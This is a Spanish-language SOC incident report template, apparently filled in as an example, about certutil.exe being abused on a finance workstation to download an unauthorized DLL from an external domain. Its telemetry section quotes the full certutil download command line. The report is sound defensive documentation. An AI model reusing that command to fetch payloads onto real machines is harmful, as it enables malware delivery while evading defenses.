# 🚨 Reporte de Incidente SOC: [ID del Ticket / Nombre Breve]

**Fecha del Análisis:** 2026-10-28  
**Analista:** [Tu Nombre / Usuario]  
**Severidad:** 🔴 Alta / Crítica  
**Veredicto Final:** Verdadero Positivo (True Positive)  
**Táctica MITRE ATT&CK:** Execution / Defense Evasion / Command and Control (T1105 - Ingress Tool Transfer)  

---

## 1. 📌 Resumen Ejecutivo
*(Un párrafo breve para que un gerente entienda qué pasó sin entrar en tecnicismos)*  
Se detectó una ejecución sospechosa del binario legítimo `certutil.exe` en el equipo `FINANZAS-PC03`. La herramienta fue utilizada para descargar un archivo `.dll` no autorizado desde un dominio externo desconocido (`temp-storage-downloads.com`). El equipo fue aislado de la red para prevenir ejecución o propagación de malware.

---

## 2. 🔍 Telemetría del Evento (Evidencia)
*(Copia del log o evento original)*

```text
Event ID: 1
Timestamp: 2026-10-28T15:45:12Z
Hostname: FINANZAS-PC03
User: CORP\c.rodriguez
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil.exe -urlcache -split -f "[https://temp-storage-downloads.com/update.dll](https://temp-storage-downloads.com/update.dll)" C:\Users\Public\update.dll
ParentImage: C:\Windows\System32\cmd.exe
